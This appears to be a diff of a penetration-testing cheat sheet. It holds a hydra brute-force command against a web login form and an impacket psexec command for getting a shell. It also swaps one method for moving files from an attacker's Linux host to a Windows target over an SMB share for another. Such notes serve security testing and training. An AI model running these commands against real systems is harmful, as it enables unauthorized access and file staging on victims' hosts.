@@ -1323,11 +1323,13 @@ hydra l user_name_here -p /path/to/wordlist url_here http-form-post "/path/to/lo
 # get shell as user
 /path/to/impacket/psexec.py domain/user@IP_here
 
-# run smb server to transfer files to Windows host
-# on Linux / attacker's box
-/path/to/impacket/examples/smbserver.py share_name_here /path/to/share
-# on Windows target
-copy \\IP_attacker\share_name_here\file_name_here
+# create public share for file transfer Win <--> Lin
+# setup share on Lin
+/path/to/impacket-smbserver share_name_here full_path_here
+# mount share on Win
+New-PSDrive -Name "share_name_here_can_be_different_from_above" -PSProvider "FileSystem" -Root "\\Lin_IP_here\share_name_here"
+# access drive
+cd share_name_here_can_be_different_from_above
 ```
 
 
